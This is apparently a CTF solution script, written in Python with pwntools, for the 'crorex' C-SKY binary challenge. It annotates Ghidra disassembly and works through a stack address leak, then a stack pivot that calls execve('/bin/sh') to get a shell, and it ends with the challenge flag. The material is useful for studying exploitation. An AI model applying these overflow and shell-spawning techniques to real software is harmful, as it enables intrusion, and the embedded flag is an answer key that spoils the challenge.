from pwn import *

context.bits = 32
context.log_level = 'debug'

# run command "file ./crorex" to get ELF information, due to statically linked, elf address is fixed
'''
./crorex: ELF 32-bit LSB executable, C-SKY processor family, version 1 (SYSV), statically linked, stripped
'''

# run command "./qemu ./crorex" to execute binary, due to qemu with ASLR disabled, stack address is fixed

# ghidra plugin for C-SKY architecture (https://github.com/leommxj/ghidra_csky) has to be installed to analyze C-SKY binary in ghidra
# C-SKY assembly is closest in style and syntax to MIPS, followed by similarities to RISC-V
# key points of C-SKY assembly that should be noted for this challenge:
# 1. r0-r3 registers are used to store function arguments
# 2. "trap 0x0" instruction in C-SKY is similar to "syscall" instruction in x86_64
# 3. r7 register is used to store syscall number for "trap 0x0" instruction
# 4. syscall number for C-SKY can be found here in https://gpages.juszkiewicz.com.pl/syscalls-table/syscalls.html
# 5. r8 register in C-SKY is similar to rbp register in x86_64, and r15 register in C-SKY is similar to rip register in x86_64

# disassembled vuln function in ghidra (partially omitted)
'''
                             **************************************************************
                             *                          FUNCTION                          *
                             **************************************************************
                             undefined vuln()
             undefined         <UNASSIGNED>   <RETURN>
             undefined4        Stack[-0xc]:4  local_c                                 XREF[2]:     00008246(*), 
                                                                                                   0000876c(*)  
             undefined4        Stack[-0x10]:4 local_10                                XREF[5]:     0000827a(*), 
                                                                                                   00008288(*), 
                                                                                                   00008748(*), 
                                                                                                   0000874c(*), 
                                                                                                   00008756(*)  
             undefined4        Stack[-0x14]:4 local_14                                XREF[2]:     00008272(*), 
                                                                                                   00008758(*)  
             undefined4        Stack[-0x18]:4 local_18                                XREF[99]:    00008294(*), 
                                                                                                   0000829a(*), 
                                                                                                   000082a6(*), 
                                                                                                   000082b2(*), 
                                                                                                   000082be(*), 
                                                                                                   000082ca(*), 
                                                                                                   000082d6(*), 
                                                                                                   000082e2(*), 
                                                                                                   000082ee(*), 
                                                                                                   000082fa(*), 
                                                                                                   00008306(*), 
                                                                                                   00008312(*), 
                                                                                                   0000831e(*), 
                                                                                                   0000832a(*), 
                                                                                                   00008336(*), 
                                                                                                   00008340(*), 
                                                                                                   0000834a(*), 
                                                                                                   00008354(*), 
                                                                                                   0000835e(*), 
                                                                                                   00008368(*)  
                             vuln                                            XREF[1]:     main:00008784(c)  
        0000823c 23 14           subi       sp,sp,0xc
        0000823e ee dd 02 20     st.w       r15,(sp,0x8)
        00008242 0e dd 01 20     st.w       r8,(sp,0x4)
        00008246 80 b8           st.w       r4,(sp=>local_c,0x0)
        00008248 3b 6e           mov        r8,sp
        0000824a 3c 14           subi       sp,sp,0x70
        0000824c 1b 32           movi       r2,0x1b
        0000824e 31 13           lrw        r1=>s_Give_me_something_to_read:_00008a60,PTR_   = "Give me something to read:\n"
                                                                                             = 00008a60
        00008250 01 30           movi       r0,0x1
        00008252 00 e0 31 03     bsr        write                                            undefined write()
        00008256 00 c4 20 48     mov        r0,r0
        0000825a 88 e4 07 10     subi       r4,r8,0x8
        0000825e 68 e4 6f 10     subi       r3,r8,0x70
        00008262 80 32           movi       r2,0x80
        00008264 41 42           lsli       r2,r2 ,0x1
        00008266 4f 6c           mov        r1,r3
        00008268 00 30           movi       r0,0x0
        0000826a 00 e0 fd 02     bsr        read                                             undefined read()
        0000826e 00 c4 20 48     mov        r0,r0
        00008272 00 b4           st.w       r0,(r4=>local_14,0x0)
        00008274 48 e4 03 10     subi       r2,r8,0x4
        00008278 00 33           movi       r3,0x0
        0000827a 60 b2           st.w       r3,(r2=>local_10,0x0)
        0000827c 00 e8 69 02     br         LAB_0000874e

                             LAB_00008280                                    XREF[1]:     0000875c(j)  
        00008280 48 e4 6f 10     subi       r2,r8,0x70
        00008284 68 e4 03 10     subi       r3,r8,0x4
        00008288 60 93           ld.w       r3=>local_10,(r3,0x0)
        0000828a c8 60           addu       r3,r2
        0000828c 60 83           ld.b       r3,(r3,0x0)
        0000828e cc 74           zextb      r3,r3
        00008290 48 e4 0b 10     subi       r2,r8,0xc
        00008294 60 b2           st.w       r3,(r2=>local_18,0x0)
        00008296 68 e4 0b 10     subi       r3,r8,0xc
        0000829a 60 93           ld.w       r3=>local_18,(r3,0x0)
        0000829c 41 3b           cmpnei     r3,0x1
        0000829e 40 e8 4c 02     bf         LAB_00008736

...... (omitted)

        0000872a 68 e4 0b 10     subi       r3,r8,0xc
        0000872e 60 93           ld.w       r3=>local_18,(r3,0x0)
        00008730 43 eb fa 00     cmpnei     r3,0xfa
        00008734 06 08           bt         LAB_00008740
                             LAB_00008736                                    XREF[97]:    0000829e(j), 000082aa(j), 
                                                                                          000082b6(j), 000082c2(j), 
                                                                                          000082ce(j), 000082da(j), 
                                                                                          000082e6(j), 000082f2(j), 
                                                                                          000082fe(j), 0000830a(j), 
                                                                                          00008316(j), 00008322(j), 
                                                                                          0000832e(j), 0000833a(j), 
                                                                                          00008344(j), 0000834e(j), 
                                                                                          00008358(j), 00008362(j), 
                                                                                          0000836c(j), 00008376(j), [more]
        00008736 00 30           movi       r0,0x0
        00008738 00 e0 e6 00     bsr        exit                                             undefined exit()
        0000873c 00 c4 20 48     mov        r0,r0
                             LAB_00008740                                    XREF[1]:     00008734(j)  
        00008740 48 e4 03 10     subi       r2,r8,0x4
        00008744 68 e4 03 10     subi       r3,r8,0x4
        00008748 60 93           ld.w       r3=>local_10,(r3,0x0)
        0000874a 00 23           addi       r3,0x1
        0000874c 60 b2           st.w       r3,(r2=>local_10,0x0)
                             LAB_0000874e                                    XREF[1]:     0000827c(j)  
        0000874e 48 e4 03 10     subi       r2,r8,0x4
        00008752 68 e4 07 10     subi       r3,r8,0x8
        00008756 40 92           ld.w       r2=>local_10,(r2,0x0)
        00008758 60 93           ld.w       r3=>local_14,(r3,0x0)
        0000875a c9 64           cmplt      r2,r3
        0000875c 60 e8 92 fd     bt         LAB_00008280
        00008760 03 6c           mov        r0,r0
        00008762 a3 6f           mov        sp,r8
        00008764 ee d9 02 20     ld.w       r15,(sp,0x8)
        00008768 0e d9 01 20     ld.w       r8,(sp,0x4)
        0000876c 80 98           ld.w       r4,(sp=>local_c,0x0)
        0000876e 03 14           addi       sp,sp,0xc
        00008770 3c 78           rts
'''
# after prolouge and before epilogue:
# value in r8 is saved r4
# value in r8+0x4 is saved r8
# value in r8+0x8 is saved r15
# buffer starts from r8-0x70

# decompiled vuln function in ghidra
'''
int vuln(void)

{
  int iVar1;
  byte abStack_7c [100];
  uint local_18;
  int local_14;
  int local_10;
  
  write(1,"Give me something to read:\n",0x1b);
  iVar1 = read(0,abStack_7c,0x100);
  local_14 = iVar1;
  for (local_10 = 0; local_10 < local_14; local_10 = local_10 + 1) {
    local_18 = (uint)abStack_7c[local_10];
    if (((((((((local_18 == 1) || (local_18 == 2)) || (local_18 == 3)) ||
            ((local_18 == 6 || (local_18 == 7)))) ||
           ((((((local_18 == 9 || ((local_18 == 10 || (local_18 == 0xb)))) || (local_18 == 0xd)) ||
              ((((local_18 == 0xe || (local_18 == 0xf)) || (local_18 == 0x11)) ||
               (((local_18 == 4 || (local_18 == 0x13)) ||
                ((local_18 == 0x14 || ((local_18 == 0x15 || (local_18 == 0x16)))))))))) ||
             (((local_18 == 0x1d ||
               ((((local_18 == 0x1e || (local_18 == 0x1f)) || (local_18 == 0x20)) ||
                ((local_18 == 0x21 || (local_18 == 0x22)))))) ||
              ((local_18 == 0x23 || ((local_18 == 0x2a || (local_18 == 0x2b)))))))) ||
            (local_18 == 0x2d)))) ||
          ((((((((local_18 == 0x30 || (local_18 == 0x31)) || (local_18 == 0x32)) ||
               ((local_18 == 0x34 || (local_18 == 0x3a)))) || (local_18 == 0x3b)) ||
             ((local_18 == 0x3d || (local_18 == 0x40)))) ||
            ((local_18 == 0x42 || (((local_18 == 0x48 || (local_18 == 0x4b)) || (local_18 == 0x4e)))
             ))) || (((((local_18 == 0x50 || (local_18 == 0x54)) || (local_18 == 0x5a)) ||
                      ((local_18 == 0x5b || (local_18 == 0x5d)))) ||
                     ((((local_18 == 0x5f ||
                        (((local_18 == 0x60 || (local_18 == 99)) || (local_18 == 0x6a)))) ||
                       ((local_18 == 0x6b || (local_18 == 0x6d)))) || (local_18 == 0x6f)))))))) ||
         (((local_18 == 0x72 || (local_18 == 0x78)) ||
          ((local_18 == 0x7b ||
           ((((local_18 == 0x7e || (local_18 == 0x7f)) || (local_18 == 0x80)) ||
            ((local_18 == 0x84 || (local_18 == 0x8a)))))))))) ||
        (((local_18 == 0x8b || ((local_18 == 0x8d || (local_18 == 0x8f)))) ||
         ((((local_18 == 0x90 || (((local_18 == 0x95 || (local_18 == 0x9a)) || (local_18 == 0x9b))))
           || (((local_18 == 0x9d || (local_18 == 0x9f)) || (local_18 == 0xa2)))) ||
          (((local_18 == 0xa5 || (local_18 == 0xab)) ||
           ((local_18 == 0xad || (((local_18 == 0xaf || (local_18 == 0xb2)) || (local_18 == 0xb5))))
           )))))))) ||
       ((((local_18 == 0xbb || (local_18 == 0xbd)) ||
         ((local_18 == 0xbf ||
          (((((local_18 == 0xc2 || (local_18 == 200)) ||
             ((local_18 == 0xcb ||
              ((((local_18 == 0xcd || (local_18 == 0xce)) || (local_18 == 0xd2)) ||
               ((local_18 == 0xd4 || (local_18 == 0xd5)))))))) || (local_18 == 0xd9)) ||
           ((local_18 == 0xda || (local_18 == 0xdf)))))))) ||
        ((((local_18 == 0x18 || (((local_18 == 0xe4 || (local_18 == 0xe5)) || (local_18 == 0xe9))))
          || (((local_18 == 0xed || (local_18 == 0xee)) || (local_18 == 0xf1)))) ||
         ((local_18 == 0xf2 || (local_18 == 0xfa)))))))) {
      iVar1 = exit(0);
    }
  }
  return iVar1;
}
'''
# read 0x100 bytes at most to buffer (buffer overflow vulnerability)
# but there is a check right after read, if any of read-in byte has a specified disallowed value, program will exit
# disallowed values:
# 0x1, 0x2, 0x3, 0x4, 0x6, 0x7, 0x9, 0xa, 0xb, 0xd, 0xe, 0xf, 0x11, 0x13, 0x14, 0x15, 0x16, 0x18, 0x1d, 0x1e, 0x1f,
# 0x20, 0x21, 0x22, 0x23, 0x2a, 0x2b, 0x2d, 0x30, 0x31, 0x32, 0x34, 0x3a, 0x3b, 0x3d,
# 0x40, 0x42, 0x48, 0x4b, 0x4e, 0x50, 0x54, 0x5a, 0x5b, 0x5d, 0x5f,
# 0x60, 0x63, 0x6a, 0x6b, 0x6d, 0x6f, 0x72, 0x78, 0x7b, 0x7e, 0x7f,
# 0x80, 0x84, 0x8a, 0x8b, 0x8d, 0x8f, 0x90, 0x95, 0x9a, 0x9b, 0x9d, 0x9f,
# 0xa2, 0xa5, 0xab, 0xad, 0xaf, 0xb2, 0xb5, 0xbb, 0xbd, 0xbf,
# 0xc2, 0xc8, 0xcb, 0xcd, 0xce, 0xd2, 0xd4, 0xd5, 0xd9, 0xda, 0xdf,
# 0xe4, 0xe5, 0xe9, 0xed, 0xee, 0xf1, 0xf2, 0xfa

# 1. leak buffer start address
p = process(['./qemu', './crorex'])
# p = remote('crorex-012f780dd99fb3aa.challs.tfcctf.com', 1337, ssl=True)
# buffer overflow to overwrite vuln's saved r15 (avoid using any of disallowed values)
# jump from 0x8770 (vuln) to 0x8250+1 (vuln) can call write to leak data on stack
p.send(b'?'*0x78+p32(0x8250+1))
# leak read-in number of bytes of stack data from buffer start address
p.recvuntil(b'?'*0x50+p32(0x7c))
'''
00000000  3f 3f 3f 3f  3f 3f 3f 3f  3f 3f 3f 3f  3f 3f 3f 3f
*
00000050  7c 00 00 00  fc f5 ff 3f  01 00 00 00  55 00 00 00
00000060  00 00 00 00  70 f6 ff 3f  7c 00 00 00  fc f5 ff 3f
00000070  01 00 00 00  3f 3f 3f 3f  56 82 00 00
'''
# get buffer start address
buffer_start_addr = u32(p.recv(4))
log.info(f"buffer start addr: {hex(buffer_start_addr)}")  # 0x3ffff61c locally, 0x3ffffebc remotely
p.close()

# disassembled syscall function in ghidra
'''
                             **************************************************************
                             *                          FUNCTION                          *
                             **************************************************************
                             undefined syscall()
             undefined         <UNASSIGNED>   <RETURN>
             undefined4        Stack[-0x8]:4  local_8                                 XREF[2]:     000087e6(*), 
                                                                                                   00008836(*)  
             undefined4        Stack[-0xc]:4  local_c                                 XREF[2]:     000087f0(*), 
                                                                                                   0000881c(*)  
             undefined4        Stack[-0x10]:4 local_10                                XREF[2]:     000087f8(*), 
                                                                                                   0000880a(*)  
             undefined4        Stack[-0x14]:4 local_14                                XREF[2]:     000087fe(*), 
                                                                                                   00008810(*)  
             undefined4        Stack[-0x18]:4 local_18                                XREF[2]:     00008804(*), 
                                                                                                   00008816(*)  
                             syscall                                         XREF[3]:     read:00008898(c), 
                                                                                          write:000088e8(c), 000089cc(*)  
        000087e0 22 14           subi       sp,sp,0x8
        000087e2 0e dd 01 20     st.w       r8,(sp,0x4)
        000087e6 e0 b8           st.w       r7,(sp=>local_8,0x0)
        000087e8 3b 6e           mov        r8,sp
        000087ea 24 14           subi       sp,sp,0x10
        000087ec 88 e5 03 10     subi       r12,r8,0x4
        000087f0 0c dc 00 20     st.w       r0,(r12=>local_c,0x0)
        000087f4 08 e4 07 10     subi       r0,r8,0x8
        000087f8 20 b0           st.w       r1,(r0=>local_10,0x0)
        000087fa 28 e4 0b 10     subi       r1,r8,0xc
        000087fe 40 b1           st.w       r2,(r1=>local_14,0x0)
        00008800 48 e4 0f 10     subi       r2,r8,0x10
        00008804 60 b2           st.w       r3,(r2=>local_18,0x0)
        00008806 68 e4 07 10     subi       r3,r8,0x8
        0000880a 00 93           ld.w       r0=>local_10,(r3,0x0)
        0000880c 68 e4 0b 10     subi       r3,r8,0xc
        00008810 20 93           ld.w       r1=>local_14,(r3,0x0)
        00008812 68 e4 0f 10     subi       r3,r8,0x10
        00008816 40 93           ld.w       r2=>local_18,(r3,0x0)
        00008818 68 e4 03 10     subi       r3,r8,0x4
        0000881c 83 d9 00 20     ld.w       r12=>local_c,(r3,0x0)
        00008820 6c e4 ff 20     andi       r3,r12,0xff
        00008824 14 2b           subi       r3,0x15
        00008826 cf 6d           mov        r7,r3
        00008828 00 c0 20 20     trap       0x0
        0000882c c3 6c           mov        r3,r0
        0000882e 0f 6c           mov        r0,r3
        00008830 a3 6f           mov        sp,r8
        00008832 0e d9 01 20     ld.w       r8,(sp,0x4)
        00008836 e0 98           ld.w       r7,(sp=>local_8,0x0)
        00008838 02 14           addi       sp,sp,0x8
        0000883a 3c 78           rts
'''
# after prolouge and before epilogue:
# value in r8-0x8, r8-0xc, and r8-0x10 are viewed as first three syscall arguments and stored in r0, r1, r2 registers
# value in r8-0x4 is subtracted by 0x15, viewed as syscall number, and stored in r7 register for "trap 0x0" instruction

# decompiled syscall function in ghidra
'''
undefined4 syscall(undefined4 param_1,undefined4 param_2)

{
  trap_exception(0);
  return param_2;
}
'''

# disassembled epilogue of read function in ghidra
'''
        000088a4 a3 6f           mov        sp,r8
        000088a6 ee d9 01 20     ld.w       r15,(sp,0x4)
        000088aa 0e d9 00 20     ld.w       r8=>local_8,(sp,0x0)
        000088ae 02 14           addi       sp,sp,0x8
        000088b0 3c 78           rts
'''

# 2. trigger execve("/bin/sh", NULL, NULL)
p = process(['./qemu', './crorex'])
# p = remote('crorex-012f780dd99fb3aa.challs.tfcctf.com', 1337, ssl=True)
p.recvuntil(b'Give me something to read:')
# first read: buffer overflow to overwrite vuln's saved r15 (avoid using any of disallowed values)
# jump from 0x8770 (vuln) to 0x8268 (vuln) can call second read
p.send(b'\x00'*0x78+p32(0x8268))
# second read (read(0, buffer_start_addr, 0x7c)): buffer overflow to overwrite syscall's saved r8 (for stack pivoting)
# prolouge of syscall stores r8 to buffer_start_addr+0x64, epilogue of syscall restores r8 from buffer_start_addr+0x64, now r8=buffer_start_addr+0x5c
# epilogue of read restores r8 from r8=buffer_start_addr+0x5c and r15 from r8+0x4=buffer_start_addr+0x60, now r8=buffer_start_addr+0x18 and r15=0x8806
# jump from 0x88b0 (read) to 0x8806 (syscall) can trigger execve("/bin/sh", NULL, NULL) syscall
p.send(b'/bin/sh\x00'+p32(0)+p32(0)+p32(buffer_start_addr)+p32(221+0x15)+b'\x00'*0x44+p32(buffer_start_addr+0x18)+p32(0x8806)+p32(buffer_start_addr+0x5c))
# starting from jumped 0x8806 till "trap 0x0" instruction: r8=buffer_start_addr+0x18, r0=*(r8-0x8)=buffer_start_addr=&'/bin/sh\x00', r1=*(r8-0xc)=0, r2=*(r8-0x10)=0, r7=*(r8-0x4)=221+0x15
p.interactive()

# how to debug C-SKY binary with pwndbg: https://theromanxpl0.it/posts/2025/09/tfc-ctf-25-cromozominus-rex/
# TFCCTF{cromozominus_pulisaki_in_redacted_cro++_crorex_crovid}